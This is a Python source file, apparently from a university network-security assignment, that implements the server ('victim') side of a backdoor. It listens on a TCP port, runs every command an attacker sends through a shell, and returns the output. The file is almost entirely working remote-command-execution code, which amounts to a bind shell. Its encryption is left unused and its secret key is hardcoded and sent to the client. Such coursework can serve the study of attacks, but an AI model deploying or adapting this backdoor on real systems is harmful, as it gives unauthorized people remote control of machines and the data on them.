#!/usr/bin/python
'''
COMP 8505 - Assignment 3
Backdoor - Server (Victim) by Jeffrey Sasaki

The server program will execute a command given by the client (attacker) and
outputs the response back to the client.
'''
from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import subprocess
import optparse
import sys
import setproctitle

title = "backdoor"
setproctitle.setproctitle(title)

# encrypt/encode and decrypt/decode a string

# random secret key (both the client and server must match this key)
secret = "sixteen byte key"

# parse command line argument
# generally any output would be concealed on the server (victim's) side
parser = optparse.OptionParser("usage: python server.py -p <port>")
parser.add_option('-p', dest='port', type = 'int', help = 'port')
(options, args) = parser.parse_args()
if (options.port == None):
	print parser.usage
	sys.exit()
else:
	port = options.port

# listen for client
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', port))
c.listen(1)
s, a = c.accept()
s.send('You are connected' + secret)

while True:
	data = s.recv(10240)
	print("data:",data)

	# decrypt data
	decrypted = data
	
	# check for "exit" by the attacker
   	

	# execute command
	proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdoutput = proc.stdout.read() + proc.stderr.read() + secret

	# encrypt output
	#encrypted = EncodeAES(cipher, stdoutput)
	print(stdoutput)
	# send encrypted output
	s.send(stdoutput)
s.close()
sys.exit()
